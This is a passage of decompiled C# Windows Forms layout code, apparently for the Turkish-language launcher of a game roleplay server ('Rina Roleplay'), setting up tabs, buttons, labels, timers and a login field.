			this.m_IssuerRef.SuspendLayout();
			((ISupportInitialize)this.threadRef).BeginInit();
			this.m_TokenRef.SuspendLayout();
			this.paramRef.SuspendLayout();
			this.expressionRef.SuspendLayout();
			this.m_SerializerRef.SuspendLayout();
			this.m_ComparatorRef.SuspendLayout();
			this.m_ResolverRef.SuspendLayout();
			((ISupportInitialize)this._RegistryRef).BeginInit();
			((ISupportInitialize)this._CandidateRef).BeginInit();
			base.SuspendLayout();
			this.label_0.Anchor = AnchorStyles.Right;
			this.label_0.BackColor = Color.Silver;
			this.label_0.Font = new Font("Corbel", 9f, FontStyle.Bold, GraphicsUnit.Point, 162);
			this.label_0.ForeColor = Color.White;
			this.label_0.Location = new Point(2, 547);
			this.label_0.Name = "Durum";
			this.label_0.Padding = new Padding(10, 0, 0, 0);
			this.label_0.Size = new Size(995, 21);
			this.label_0.TabIndex = 2;
			this.label_0.Text = "Fonksiyonlar kontrol ediliyor...";
			this.label_0.TextAlign = ContentAlignment.MiddleLeft;
			this.label_0.Click += this.InterruptIdentifier;
			this.m_PropertyRef.BackColor = Color.Transparent;
			this.m_PropertyRef.BackgroundImage = (Image)componentResourceManager.GetObject("pictureBox2.BackgroundImage");
			this.m_PropertyRef.ErrorImage = (Image)componentResourceManager.GetObject("pictureBox2.ErrorImage");
			this.m_PropertyRef.InitialImage = null;
			this.m_PropertyRef.Location = new Point(200, 29);
			this.m_PropertyRef.Name = "pictureBox2";
			this.m_PropertyRef.Size = new Size(27, 27);
			this.m_PropertyRef.TabIndex = 14;
			this.m_PropertyRef.TabStop = false;
			this.m_PropertyRef.Click += this.FillRef;
			this.m_WatcherRef.BackColor = Color.Transparent;
			this.m_WatcherRef.BackgroundImage = (Image)componentResourceManager.GetObject("pictureBox3.BackgroundImage");
			this.m_WatcherRef.ErrorImage = (Image)componentResourceManager.GetObject("pictureBox3.ErrorImage");
			this.m_WatcherRef.Location = new Point(167, 29);
			this.m_WatcherRef.Name = "pictureBox3";
			this.m_WatcherRef.Size = new Size(27, 27);
			this.m_WatcherRef.TabIndex = 15;
			this.m_WatcherRef.TabStop = false;
			this.m_WatcherRef.Click += this.PopRef;
			this.m_ConnectionRef.BackColor = Color.Transparent;
			this.m_ConnectionRef.BackgroundImage = (Image)componentResourceManager.GetObject("pictureBox4.BackgroundImage");
			this.m_ConnectionRef.ErrorImage = (Image)componentResourceManager.GetObject("pictureBox4.ErrorImage");
			this.m_ConnectionRef.Location = new Point(134, 29);
			this.m_ConnectionRef.Name = "pictureBox4";
			this.m_ConnectionRef.Size = new Size(27, 27);
			this.m_ConnectionRef.TabIndex = 16;
			this.m_ConnectionRef.TabStop = false;
			this.m_ConnectionRef.Click += this.EnableRef;
			this._VisitorRef.BackColor = Color.Transparent;
			this._VisitorRef.BackgroundImage = (Image)componentResourceManager.GetObject("pictureBox7.BackgroundImage");
			this._VisitorRef.ErrorImage = (Image)componentResourceManager.GetObject("pictureBox7.ErrorImage");
			this._VisitorRef.Location = new Point(965, 9);
			this._VisitorRef.Name = "pictureBox7";
			this._VisitorRef.Size = new Size(34, 32);
			this._VisitorRef.TabIndex = 20;
			this._VisitorRef.TabStop = false;
			this._VisitorRef.Click += this.StartIdentifier;
			this.authenticationRef.Enabled = true;
			this.authenticationRef.Interval = 30000;
			this.authenticationRef.Tick += this.ConnectIdentifier;
			this._PolicyRef.BackColor = Color.Transparent;
			this._PolicyRef.BackgroundImage = (Image)componentResourceManager.GetObject("minimize.BackgroundImage");
			this._PolicyRef.ErrorImage = (Image)componentResourceManager.GetObject("minimize.ErrorImage");
			this._PolicyRef.Location = new Point(936, 10);
			this._PolicyRef.Name = "minimize";
			this._PolicyRef.Size = new Size(32, 32);
			this._PolicyRef.TabIndex = 26;
			this._PolicyRef.TabStop = false;
			this._PolicyRef.Click += this.SetupIdentifier;
			this.containerRef.BalloonTipText = "Rina Roleplay";
			this.containerRef.BalloonTipTitle = "Rina Roleplay";
			this.containerRef.Icon = (Icon)componentResourceManager.GetObject("notifyIcon1.Icon");
			this.containerRef.Text = "Rina Roleplay";
			this.containerRef.MouseDoubleClick += this.GetIdentifier;
			this._InvocationRef.Interval = 350;
			this._InvocationRef.Tick += this.OrderIdentifier;
			this.serverRef.WorkerReportsProgress = true;
			this.serverRef.WorkerSupportsCancellation = true;
			this.serverRef.DoWork += this.ManageIdentifier;
			this._ReponseRef.WorkerReportsProgress = true;
			this._ReponseRef.WorkerSupportsCancellation = true;
			this._ReponseRef.DoWork += this.ComputeIdentifier;
			this.backgroundWorker_0.WorkerReportsProgress = true;
			this.backgroundWorker_0.WorkerSupportsCancellation = true;
			this.backgroundWorker_0.DoWork += this.ChangeIdentifier;
			this.backgroundWorker_0.RunWorkerCompleted += this.AwakeIdentifier;
			this._ContextRef.WorkerReportsProgress = true;
			this._ContextRef.WorkerSupportsCancellation = true;
			this._ContextRef.DoWork += this.SetIdentifier;
			this._ContextRef.RunWorkerCompleted += this.CustomizeIdentifier;
			this.m_ClientRef.Anchor = AnchorStyles.Right;
			this.m_ClientRef.BackColor = Color.Transparent;
			this.m_ClientRef.Font = new Font("Corbel", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 162);
			this.m_ClientRef.ForeColor = Color.White;
			this.m_ClientRef.Location = new Point(923, 547);
			this.m_ClientRef.Name = "acdurum";
			this.m_ClientRef.Size = new Size(74, 21);
			this.m_ClientRef.TabIndex = 36;
			this.m_ClientRef.Text = "AC:";
			this.m_ClientRef.TextAlign = ContentAlignment.MiddleRight;
			this.collectionRef.Location = new Point(381, 512);
			this.collectionRef.Name = "metroButton1";
			this.collectionRef.Size = new Size(100, 23);
			this.collectionRef.Style = 3;
			this.collectionRef.TabIndex = 39;
			this.collectionRef.Text = "Giriş Yap";
			this.collectionRef.Theme = 2;
			this.collectionRef.UseSelectable = true;
			this.collectionRef.Click += this.EnableIdentifier;
			this.m_ModelRef.Controls.Add(this.m_IssuerRef);
			this.m_ModelRef.Controls.Add(this.m_TokenRef);
			this.m_ModelRef.Controls.Add(this.expressionRef);
			this.m_ModelRef.Controls.Add(this.m_ComparatorRef);
			this.m_ModelRef.Location = new Point(22, 62);
			this.m_ModelRef.Name = "metroTabControl1";
			this.m_ModelRef.SelectedIndex = 0;
			this.m_ModelRef.Size = new Size(954, 444);
			this.m_ModelRef.Style = 3;
			this.m_ModelRef.TabIndex = 40;
			this.m_ModelRef.Theme = 2;
			this.m_ModelRef.UseSelectable = true;
			this.m_ModelRef.SelectedIndexChanged += this.TestIdentifier;
			this.m_IssuerRef.Controls.Add(this.metroLabel_0);
			this.m_IssuerRef.Controls.Add(this._WriterRef);
			this.m_IssuerRef.Controls.Add(this.threadRef);
			this.m_IssuerRef.HorizontalScrollbarBarColor = true;
			this.m_IssuerRef.HorizontalScrollbarHighlightOnWheel = false;
			this.m_IssuerRef.HorizontalScrollbarSize = 10;
			this.m_IssuerRef.Location = new Point(4, 38);
			this.m_IssuerRef.Name = "metroTabPage2";
			this.m_IssuerRef.Size = new Size(946, 402);
			this.m_IssuerRef.TabIndex = 4;
			this.m_IssuerRef.Text = "Anasayfa";
			this.m_IssuerRef.UseCustomBackColor = true;
			this.m_IssuerRef.UseCustomForeColor = true;
			this.m_IssuerRef.VerticalScrollbarBarColor = true;
			this.m_IssuerRef.VerticalScrollbarHighlightOnWheel = false;
			this.m_IssuerRef.VerticalScrollbarSize = 10;
			this.m_IssuerRef.Click += this.FindIdentifier;
			this.metroLabel_0.AutoSize = true;
			this.metroLabel_0.FontWeight = 1;
			this.metroLabel_0.Location = new Point(24, 353);
			this.metroLabel_0.Name = "duyuru_alt";
			this.metroLabel_0.Size = new Size(74, 19);
			this.metroLabel_0.TabIndex = 4;
			this.metroLabel_0.Text = "Alt duyuru";
			this.metroLabel_0.UseCustomBackColor = true;
			this.metroLabel_0.UseCustomForeColor = true;
			this.metroLabel_0.Click += this.MapIdentifier;
			this._WriterRef.AutoSize = true;
			this._WriterRef.FontSize = 2;
			this._WriterRef.FontWeight = 2;
			this._WriterRef.Location = new Point(24, 317);
			this._WriterRef.Name = "duyuru";
			this._WriterRef.Size = new Size(112, 25);
			this._WriterRef.TabIndex = 3;
			this._WriterRef.Text = "Ana duyuru";
			this._WriterRef.UseCustomBackColor = true;
			this._WriterRef.UseCustomForeColor = true;
			this._WriterRef.Click += this.ConcatIdentifier;
			this.threadRef.Location = new Point(15, 13);
			this.threadRef.Name = "pictureBox5";
			this.threadRef.Size = new Size(916, 372);
			this.threadRef.SizeMode = PictureBoxSizeMode.CenterImage;
			this.threadRef.TabIndex = 2;
			this.threadRef.TabStop = false;
			this.m_TokenRef.BackColor = SystemColors.AppWorkspace;
			this.m_TokenRef.Controls.Add(this.paramRef);
			this.m_TokenRef.Controls.Add(this.m_MerchantRef);
			this.m_TokenRef.Controls.Add(this._ProductRef);
			this.m_TokenRef.Controls.Add(this._StructRef);
			this.m_TokenRef.Controls.Add(this._DefinitionRef);
			this.m_TokenRef.Controls.Add(this.taskRef);
			this.m_TokenRef.HorizontalScrollbarBarColor = true;
			this.m_TokenRef.HorizontalScrollbarHighlightOnWheel = false;
			this.m_TokenRef.HorizontalScrollbarSize = 10;
			this.m_TokenRef.Location = new Point(4, 38);
			this.m_TokenRef.Name = "metroTabPage1";
			this.m_TokenRef.Size = new Size(946, 402);
			this.m_TokenRef.Style = 3;
			this.m_TokenRef.TabIndex = 3;
			this.m_TokenRef.Text = "Ayarlar";
			this.m_TokenRef.Theme = 2;
			this.m_TokenRef.UseCustomBackColor = true;
			this.m_TokenRef.UseCustomForeColor = true;
			this.m_TokenRef.UseStyleColors = true;
			this.m_TokenRef.VerticalScrollbarBarColor = true;
			this.m_TokenRef.VerticalScrollbarHighlightOnWheel = false;
			this.m_TokenRef.VerticalScrollbarSize = 10;
			this.m_TokenRef.Click += this.VerifyIdentifier;
			this.paramRef.Controls.Add(this._ObserverRef);
			this.paramRef.HorizontalScrollbarBarColor = true;
			this.paramRef.HorizontalScrollbarHighlightOnWheel = false;
			this.paramRef.HorizontalScrollbarSize = 10;
			this.paramRef.Location = new Point(3, 3);
			this.paramRef.Name = "metroPanel3";
			this.paramRef.Size = new Size(939, 40);
			this.paramRef.TabIndex = 11;
			this.paramRef.Theme = 2;
			this.paramRef.VerticalScrollbarBarColor = true;
			this.paramRef.VerticalScrollbarHighlightOnWheel = false;
			this.paramRef.VerticalScrollbarSize = 10;
			this._ObserverRef.AutoSize = true;
			this._ObserverRef.FontSize = 2;
			this._ObserverRef.FontWeight = 2;
			this._ObserverRef.Location = new Point(8, 7);
			this._ObserverRef.Name = "ayarlarbaslik";
			this._ObserverRef.Size = new Size(93, 25);
			this._ObserverRef.TabIndex = 4;
			this._ObserverRef.Text = "AYARLAR";
			this._ObserverRef.UseCustomBackColor = true;
			this._ObserverRef.UseCustomForeColor = true;
			this.m_MerchantRef.AutoSize = true;
			this.m_MerchantRef.Location = new Point(23, 127);
			this.m_MerchantRef.Name = "ayarbilgi";
			this.m_MerchantRef.Size = new Size(105, 19);
			this.m_MerchantRef.TabIndex = 10;
			this.m_MerchantRef.Text = "Bilgilendirmeler:";
			this.m_MerchantRef.UseCustomBackColor = true;
			this.m_MerchantRef.UseCustomForeColor = true;
			this.m_MerchantRef.Click += this.DisableIdentifier;
			this._ProductRef.Location = new Point(765, 76);
			this._ProductRef.Name = "metroButton3";
			this._ProductRef.Size = new Size(75, 23);
			this._ProductRef.Style = 3;
			this._ProductRef.TabIndex = 9;
			this._ProductRef.Text = "Seç";
			this._ProductRef.Theme = 2;
			this._ProductRef.UseSelectable = true;
			this._ProductRef.Click += this.FillIdentifier;
			this._StructRef.CustomButton.Image = null;
			this._StructRef.CustomButton.Location = new Point(714, 1);
			this._StructRef.CustomButton.Name = "";
			this._StructRef.CustomButton.Size = new Size(21, 21);
			this._StructRef.CustomButton.Style = 4;
			this._StructRef.CustomButton.TabIndex = 1;
			this._StructRef.CustomButton.Theme = 1;
			this._StructRef.CustomButton.UseSelectable = true;
			this._StructRef.CustomButton.Visible = false;
			this._StructRef.Lines = new string[]
			{
				"Oyun Yolu"
			};
			this._StructRef.Location = new Point(23, 76);
			this._StructRef.MaxLength = 32767;
			this._StructRef.Name = "textboxoyunyolu";
			this._StructRef.PasswordChar = '\0';
			this._StructRef.ScrollBars = ScrollBars.None;
			this._StructRef.SelectedText = "";
			this._StructRef.SelectionLength = 0;
			this._StructRef.SelectionStart = 0;
			this._StructRef.ShortcutsEnabled = true;
			this._StructRef.Size = new Size(736, 23);
			this._StructRef.Style = 3;
			this._StructRef.TabIndex = 8;
			this._StructRef.Text = "Oyun Yolu";
			this._StructRef.Theme = 2;
			this._StructRef.UseSelectable = true;
			this._StructRef.WaterMarkColor = Color.FromArgb(109, 109, 109);
			this._StructRef.WaterMarkFont = new Font("Segoe UI", 12f, FontStyle.Italic, GraphicsUnit.Pixel);
			this._DefinitionRef.AutoSize = true;
			this._DefinitionRef.Location = new Point(19, 54);
			this._DefinitionRef.Name = "metroLabel1";
			this._DefinitionRef.Size = new Size(92, 19);
			this._DefinitionRef.TabIndex = 7;
			this._DefinitionRef.Text = "Oyun Yolunuz:";
			this._DefinitionRef.UseCustomBackColor = true;
			this._DefinitionRef.UseCustomForeColor = true;
			this.taskRef.Location = new Point(846, 76);
			this.taskRef.Name = "metroButton2";
			this.taskRef.Size = new Size(75, 23);
			this.taskRef.Style = 3;
			this.taskRef.TabIndex = 2;
			this.taskRef.Text = "Değiştir";
			this.taskRef.Theme = 2;
			this.taskRef.UseSelectable = true;
			this.taskRef.Click += this.PopIdentifier;
			this.expressionRef.Controls.Add(this.m_RegRef);
			this.expressionRef.Controls.Add(this._ErrorRef);
			this.expressionRef.Controls.Add(this.exceptionRef);
			this.expressionRef.Controls.Add(this.globalRef);
			this.expressionRef.Controls.Add(this.m_HelperRef);
			this.expressionRef.Controls.Add(this._EventRef);
			this.expressionRef.Controls.Add(this.factoryRef);
			this.expressionRef.Controls.Add(this.setterRef);
			this.expressionRef.Controls.Add(this.methodRef);
			this.expressionRef.Controls.Add(this.m_DecoratorRef);
			this.expressionRef.Controls.Add(this.accountRef);
			this.expressionRef.Controls.Add(this.m_ClassRef);
			this.expressionRef.Controls.Add(this.m_SerializerRef);
			this.expressionRef.HorizontalScrollbarBarColor = true;
			this.expressionRef.HorizontalScrollbarHighlightOnWheel = false;
			this.expressionRef.HorizontalScrollbarSize = 10;
			this.expressionRef.Location = new Point(4, 38);
			this.expressionRef.Name = "metroTabPage3";
			this.expressionRef.Size = new Size(946, 402);
			this.expressionRef.TabIndex = 5;
			this.expressionRef.Text = "Kısayollar";
			this.expressionRef.UseCustomBackColor = true;
			this.expressionRef.UseCustomForeColor = true;
			this.expressionRef.VerticalScrollbarBarColor = true;
			this.expressionRef.VerticalScrollbarHighlightOnWheel = false;
			this.expressionRef.VerticalScrollbarSize = 10;
			this.m_RegRef.Location = new Point(7, 368);
			this.m_RegRef.Name = "metroButton14";
			this.m_RegRef.Size = new Size(935, 23);
			this.m_RegRef.Style = 3;
			this.m_RegRef.TabIndex = 15;
			this.m_RegRef.Text = "Oyun Dışı Sohbet";
			this.m_RegRef.Theme = 2;
			this.m_RegRef.UseSelectable = true;
			this.m_RegRef.Click += this.RunIdentifier;
			this._ErrorRef.Location = new Point(7, 339);
			this._ErrorRef.Name = "metroButton13";
			this._ErrorRef.Size = new Size(935, 23);
			this._ErrorRef.Style = 3;
			this._ErrorRef.TabIndex = 14;
			this._ErrorRef.Text = "İnternet Sayfaları";
			this._ErrorRef.Theme = 2;
			this._ErrorRef.UseSelectable = true;
			this._ErrorRef.Click += this.IncludeIdentifier;
			this.exceptionRef.Location = new Point(7, 310);
			this.exceptionRef.Name = "metroButton12";
			this.exceptionRef.Size = new Size(935, 23);
			this.exceptionRef.Style = 3;
			this.exceptionRef.TabIndex = 13;
			this.exceptionRef.Text = "İlanlar";
			this.exceptionRef.Theme = 2;
			this.exceptionRef.UseSelectable = true;
			this.exceptionRef.Click += this.ViewIdentifier;
			this.globalRef.Location = new Point(7, 281);
			this.globalRef.Name = "metroButton11";
			this.globalRef.Size = new Size(935, 23);
			this.globalRef.Style = 3;
			this.globalRef.TabIndex = 12;
			this.globalRef.Text = "Birlik Tanıtımları";
			this.globalRef.Theme = 2;
			this.globalRef.UseSelectable = true;
			this.globalRef.Click += this.CancelIdentifier;
			this.m_HelperRef.Location = new Point(7, 252);
			this.m_HelperRef.Name = "metroButton10";
			this.m_HelperRef.Size = new Size(935, 23);
			this.m_HelperRef.Style = 3;
			this.m_HelperRef.TabIndex = 11;
			this.m_HelperRef.Text = "Helperler";
			this.m_HelperRef.Theme = 2;
			this.m_HelperRef.UseSelectable = true;
			this.m_HelperRef.Click += this.ResolveIdentifier;
			this._EventRef.Location = new Point(7, 223);
			this._EventRef.Name = "metroButton9";
			this._EventRef.Size = new Size(935, 23);
			this._EventRef.Style = 3;
			this._EventRef.TabIndex = 10;
			this._EventRef.Text = "Yetkililer";
			this._EventRef.Theme = 2;
			this._EventRef.UseSelectable = true;
			this._EventRef.Click += this.PatchIdentifier;
			this.factoryRef.Location = new Point(7, 194);
			this.factoryRef.Name = "metroButton8";
			this.factoryRef.Size = new Size(935, 23);
			this.factoryRef.Style = 3;
			this.factoryRef.TabIndex = 9;
			this.factoryRef.Text = "Kurallar";
			this.factoryRef.Theme = 2;
			this.factoryRef.UseSelectable = true;
			this.factoryRef.Click += this.CalculateIdentifier;
			this.setterRef.Location = new Point(7, 165);
			this.setterRef.Name = "metroButton7";
			this.setterRef.Size = new Size(935, 23);
			this.setterRef.Style = 3;
			this.setterRef.TabIndex = 8;
			this.setterRef.Text = "Manuel Model Paketi";
			this.setterRef.Theme = 2;
			this.setterRef.UseSelectable = true;
			this.setterRef.Click += this.UpdateIdentifier;
			this.methodRef.Location = new Point(7, 136);
			this.methodRef.Name = "metroButton6";
			this.methodRef.Size = new Size(935, 23);
			this.methodRef.Style = 3;
			this.methodRef.TabIndex = 7;
			this.methodRef.Text = "İndirme Sayfası";
			this.methodRef.Theme = 2;
			this.methodRef.UseSelectable = true;
			this.methodRef.Click += this.LogoutIdentifier;
			this.m_DecoratorRef.Location = new Point(7, 107);
			this.m_DecoratorRef.Name = "metroButton5";
			this.m_DecoratorRef.Size = new Size(935, 23);
			this.m_DecoratorRef.Style = 3;
			this.m_DecoratorRef.TabIndex = 6;
			this.m_DecoratorRef.Text = "Ticket Oluştur";
			this.m_DecoratorRef.Theme = 2;
			this.m_DecoratorRef.UseSelectable = true;
			this.m_DecoratorRef.Click += this.VisitIdentifier;
			this.accountRef.Location = new Point(7, 78);
			this.accountRef.Name = "yenisikayet";
			this.accountRef.Size = new Size(935, 23);
			this.accountRef.Style = 3;
			this.accountRef.TabIndex = 5;
			this.accountRef.Text = "Şikayet Oluştur";
			this.accountRef.Theme = 2;
			this.accountRef.UseSelectable = true;
			this.accountRef.Click += this.NewIdentifier;
			this.m_ClassRef.Location = new Point(7, 49);
			this.m_ClassRef.Name = "websitegit";
			this.m_ClassRef.Size = new Size(935, 23);
			this.m_ClassRef.Style = 3;
			this.m_ClassRef.TabIndex = 4;
			this.m_ClassRef.Text = "Websitesine Git";
			this.m_ClassRef.Theme = 2;
			this.m_ClassRef.UseSelectable = true;
			this.m_ClassRef.Click += this.CloneIdentifier;
			this.m_SerializerRef.Controls.Add(this._SpecificationRef);
			this.m_SerializerRef.HorizontalScrollbarBarColor = true;
			this.m_SerializerRef.HorizontalScrollbarHighlightOnWheel = false;
			this.m_SerializerRef.HorizontalScrollbarSize = 10;
			this.m_SerializerRef.Location = new Point(3, 3);
			this.m_SerializerRef.Name = "metroPanel2";
			this.m_SerializerRef.Size = new Size(939, 40);
			this.m_SerializerRef.TabIndex = 3;
			this.m_SerializerRef.Theme = 2;
			this.m_SerializerRef.VerticalScrollbarBarColor = true;
			this.m_SerializerRef.VerticalScrollbarHighlightOnWheel = false;
			this.m_SerializerRef.VerticalScrollbarSize = 10;
			this._SpecificationRef.AutoSize = true;
			this._SpecificationRef.FontSize = 2;
			this._SpecificationRef.FontWeight = 2;
			this._SpecificationRef.Location = new Point(8, 7);
			this._SpecificationRef.Name = "kisayollarbaslik";
			this._SpecificationRef.Size = new Size(120, 25);
			this._SpecificationRef.TabIndex = 4;
			this._SpecificationRef.Text = "KISAYOLLAR";
			this._SpecificationRef.UseCustomBackColor = true;
			this._SpecificationRef.UseCustomForeColor = true;
			this.m_ComparatorRef.Controls.Add(this.m_ProccesorRef);
			this.m_ComparatorRef.Controls.Add(this.processRef);
			this.m_ComparatorRef.Controls.Add(this.m_SchemaRef);
			this.m_ComparatorRef.Controls.Add(this.m_TokenizerRef);
			this.m_ComparatorRef.Controls.Add(this.roleRef);
			this.m_ComparatorRef.Controls.Add(this.metroLabel_1);
			this.m_ComparatorRef.Controls.Add(this.algoRef);
			this.m_ComparatorRef.Controls.Add(this._IteratorRef);
			this.m_ComparatorRef.Controls.Add(this.messageRef);
			this.m_ComparatorRef.Controls.Add(this.wrapperRef);
			this.m_ComparatorRef.Controls.Add(this.producerRef);
			this.m_ComparatorRef.Controls.Add(this._ManagerRef);
			this.m_ComparatorRef.Controls.Add(this.m_ResolverRef);
			this.m_ComparatorRef.HorizontalScrollbarBarColor = true;
			this.m_ComparatorRef.HorizontalScrollbarHighlightOnWheel = false;
			this.m_ComparatorRef.HorizontalScrollbarSize = 10;
			this.m_ComparatorRef.Location = new Point(4, 38);
			this.m_ComparatorRef.Name = "metroTabPage4";
			this.m_ComparatorRef.Size = new Size(946, 402);
			this.m_ComparatorRef.TabIndex = 7;
			this.m_ComparatorRef.Text = "Sunucu Durumu";
			this.m_ComparatorRef.UseCustomBackColor = true;
			this.m_ComparatorRef.UseCustomForeColor = true;
			this.m_ComparatorRef.VerticalScrollbarBarColor = true;
			this.m_ComparatorRef.VerticalScrollbarHighlightOnWheel = false;
			this.m_ComparatorRef.VerticalScrollbarSize = 10;
			this.m_ComparatorRef.Click += this.CheckIdentifier;
			this.m_ProccesorRef.AutoSize = true;
			this.m_ProccesorRef.Location = new Point(99, 57);
			this.m_ProccesorRef.Name = "kilitbilgi";
			this.m_ProccesorRef.Size = new Size(83, 19);
			this.m_ProccesorRef.TabIndex = 14;
			this.m_ProccesorRef.Text = "metroLabel2";
			this.m_ProccesorRef.UseCustomBackColor = true;
			this.m_ProccesorRef.UseCustomForeColor = true;
			this.processRef.AutoSize = true;
			this.processRef.ForeColor = Color.DimGray;
			this.processRef.Location = new Point(24, 352);
			this.processRef.Name = "sunucubilgi_11";
			this.processRef.Size = new Size(89, 19);
			this.processRef.TabIndex = 13;
			this.processRef.Text = "sunucubilgi_11";
			this.processRef.UseCustomBackColor = true;
			this.processRef.UseCustomForeColor = true;
			this.m_SchemaRef.AutoSize = true;
			this.m_SchemaRef.Location = new Point(24, 324);
			this.m_SchemaRef.Name = "sunucubilgi_10";
			this.m_SchemaRef.Size = new Size(91, 19);
			this.m_SchemaRef.TabIndex = 12;
			this.m_SchemaRef.Text = "sunucubilgi_10";
			this.m_SchemaRef.UseCustomBackColor = true;
			this.m_SchemaRef.UseCustomForeColor = true;
			this.m_TokenizerRef.AutoSize = true;
			this.m_TokenizerRef.Location = new Point(24, 296);
			this.m_TokenizerRef.Name = "sunucubilgi_9";
			this.m_TokenizerRef.Size = new Size(86, 19);
			this.m_TokenizerRef.TabIndex = 11;
			this.m_TokenizerRef.Text = "sunucubilgi_9";
			this.m_TokenizerRef.UseCustomBackColor = true;
			this.m_TokenizerRef.UseCustomForeColor = true;
			this.roleRef.AutoSize = true;
			this.roleRef.Location = new Point(24, 264);
			this.roleRef.Name = "sunucubilgi_8";
			this.roleRef.Size = new Size(86, 19);
			this.roleRef.TabIndex = 10;
			this.roleRef.Text = "sunucubilgi_8";
			this.roleRef.UseCustomBackColor = true;
			this.roleRef.UseCustomForeColor = true;
			this.metroLabel_1.AutoSize = true;
			this.metroLabel_1.Location = new Point(24, 232);
			this.metroLabel_1.Name = "sunucubilgi_7";
			this.metroLabel_1.Size = new Size(86, 19);
			this.metroLabel_1.TabIndex = 9;
			this.metroLabel_1.Text = "sunucubilgi_7";
			this.metroLabel_1.UseCustomBackColor = true;
			this.metroLabel_1.UseCustomForeColor = true;
			this.algoRef.AutoSize = true;
			this.algoRef.Location = new Point(24, 85);
			this.algoRef.Name = "sunucubilgi_2";
			this.algoRef.Size = new Size(86, 19);
			this.algoRef.TabIndex = 8;
			this.algoRef.Text = "sunucubilgi_2";
			this.algoRef.UseCustomBackColor = true;
			this.algoRef.UseCustomForeColor = true;
			this._IteratorRef.AutoSize = true;
			this._IteratorRef.Location = new Point(24, 115);
			this._IteratorRef.Name = "sunucubilgi_3";
			this._IteratorRef.Size = new Size(86, 19);
			this._IteratorRef.TabIndex = 7;
			this._IteratorRef.Text = "sunucubilgi_3";
			this._IteratorRef.UseCustomBackColor = true;
			this._IteratorRef.UseCustomForeColor = true;
			this.messageRef.AutoSize = true;
			this.messageRef.Location = new Point(24, 146);
			this.messageRef.Name = "sunucubilgi_4";
			this.messageRef.Size = new Size(86, 19);
			this.messageRef.TabIndex = 6;
			this.messageRef.Text = "sunucubilgi_4";
			this.messageRef.UseCustomBackColor = true;
			this.messageRef.UseCustomForeColor = true;
			this.wrapperRef.AutoSize = true;
			this.wrapperRef.Location = new Point(24, 175);
			this.wrapperRef.Name = "sunucubilgi_5";
			this.wrapperRef.Size = new Size(86, 19);
			this.wrapperRef.TabIndex = 5;
			this.wrapperRef.Text = "sunucubilgi_5";
			this.wrapperRef.UseCustomBackColor = true;
			this.wrapperRef.UseCustomForeColor = true;
			this.producerRef.AutoSize = true;
			this.producerRef.Location = new Point(24, 204);
			this.producerRef.Name = "sunucubilgi_6";
			this.producerRef.Size = new Size(86, 19);
			this.producerRef.TabIndex = 4;
			this.producerRef.Text = "sunucubilgi_6";
			this.producerRef.TextAlign = ContentAlignment.MiddleCenter;
			this.producerRef.UseCustomBackColor = true;
			this.producerRef.UseCustomForeColor = true;
			this._ManagerRef.AutoSize = true;
			this._ManagerRef.Location = new Point(24, 57);
			this._ManagerRef.Name = "sunucubilgi_1";
			this._ManagerRef.Size = new Size(84, 19);
			this._ManagerRef.TabIndex = 3;
			this._ManagerRef.Text = "sunucubilgi_1";
			this._ManagerRef.UseCustomBackColor = true;
			this._ManagerRef.UseCustomForeColor = true;
			this.m_ResolverRef.Controls.Add(this.m_AttributeRef);
			this.m_ResolverRef.Controls.Add(this.predicateRef);
			this.m_ResolverRef.HorizontalScrollbarBarColor = true;
			this.m_ResolverRef.HorizontalScrollbarHighlightOnWheel = false;
			this.m_ResolverRef.HorizontalScrollbarSize = 10;
			this.m_ResolverRef.Location = new Point(3, 3);
			this.m_ResolverRef.Name = "metroPanel1";
			this.m_ResolverRef.Size = new Size(940, 40);
			this.m_ResolverRef.TabIndex = 2;
			this.m_ResolverRef.Theme = 2;
			this.m_ResolverRef.VerticalScrollbarBarColor = true;
			this.m_ResolverRef.VerticalScrollbarHighlightOnWheel = false;
			this.m_ResolverRef.VerticalScrollbarSize = 10;
			this.m_AttributeRef.BackColor = SystemColors.ActiveCaptionText;
			this.m_AttributeRef.Location = new Point(855, 9);
			this.m_AttributeRef.Name = "metroButton4";
			this.m_AttributeRef.Size = new Size(75, 23);
			this.m_AttributeRef.Style = 3;
			this.m_AttributeRef.TabIndex = 4;
			this.m_AttributeRef.Text = "Güncelle";
			this.m_AttributeRef.Theme = 2;
			this.m_AttributeRef.UseSelectable = true;
			this.m_AttributeRef.Click += this.DestroyIdentifier;
			this.predicateRef.AutoSize = true;
			this.predicateRef.FontSize = 2;
			this.predicateRef.FontWeight = 2;
			this.predicateRef.Location = new Point(7, 7);
			this.predicateRef.Name = "sunucudurumubaslik";
			this.predicateRef.Size = new Size(172, 25);
			this.predicateRef.TabIndex = 3;
			this.predicateRef.Text = "SUNUCU DURUMU";
			this.predicateRef.UseCustomBackColor = true;
			this.predicateRef.UseCustomForeColor = true;
			this.workerRef.CustomButton.FlatStyle = FlatStyle.Popup;
			this.workerRef.CustomButton.Image = null;
			this.workerRef.CustomButton.Location = new Point(197, 1);
			this.workerRef.CustomButton.Name = "";
			this.workerRef.CustomButton.Padding = new Padding(3);
			this.workerRef.CustomButton.Size = new Size(21, 21);
			this.workerRef.CustomButton.Style = 4;
			this.workerRef.CustomButton.TabIndex = 1;
			this.workerRef.CustomButton.Theme = 1;
			this.workerRef.CustomButton.UseSelectable = true;
			this.workerRef.CustomButton.Visible = false;
			this.workerRef.FontWeight = 2;
			this.workerRef.Lines = new string[]
			{
				"Ad_Soyad"
			};
			this.workerRef.Location = new Point(156, 512);
			this.workerRef.MaxLength = 24;
			this.workerRef.Name = "textBox1";
			this.workerRef.PasswordChar = '\0';
			this.workerRef.ScrollBars = ScrollBars.None;
			this.workerRef.SelectedText = "";
			this.workerRef.SelectionLength = 0;
			this.workerRef.SelectionStart = 0;
			this.workerRef.ShortcutsEnabled = true;
			this.workerRef.ShowClearButton = true;
			this.workerRef.Size = new Size(219, 23);
			this.workerRef.Style = 3;
			this.workerRef.TabIndex = 41;
			this.workerRef.Text = "Ad_Soyad";
			this.workerRef.Theme = 2;
			this.workerRef.UseSelectable = true;
			this.workerRef.WaterMarkColor = Color.FromArgb(109, 109, 109);
			this.workerRef.WaterMarkFont = new Font("Segoe UI", 12f, FontStyle.Italic, GraphicsUnit.Pixel);
			this.workerRef.Click += this.ValidateIdentifier;
			this._RegistryRef.Image = (Image)componentResourceManager.GetObject("pictureBox1.Image");
			this._RegistryRef.InitialImage = (Image)componentResourceManager.GetObject("pictureBox1.InitialImage");
			this._RegistryRef.Location = new Point(22, 11);
			this._RegistryRef.Name = "pictureBox1";
